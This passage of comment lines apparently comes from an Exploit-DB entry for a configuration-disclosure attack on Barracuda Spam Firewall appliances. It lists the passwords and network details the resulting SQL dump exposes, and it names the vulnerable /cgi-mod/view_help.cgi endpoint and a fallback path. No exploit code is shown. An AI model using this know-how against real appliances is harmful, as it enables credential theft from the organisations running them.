# The resulting output is an SQL dump containing the Barracuda's configuration, which includes goodies such as:
#
# The administrative password for the BSF(system_password)
# MTA LDAP passwords(mta_ldap_advanced_password)
# Password for each configured mailbox(user_password)
# Internal networking information(system_gateway, system_ip, system_netmask, system_primary_dns_server, system_secondary_dns_server)

# Exploit-DB Notes:
# If /cgi-mod/view_help.cgi returns a 404, try /cgi-bin/view_help.cgi instead. You should be able to determine this manually since Barracuda automatically redirects you to the login page anyway.
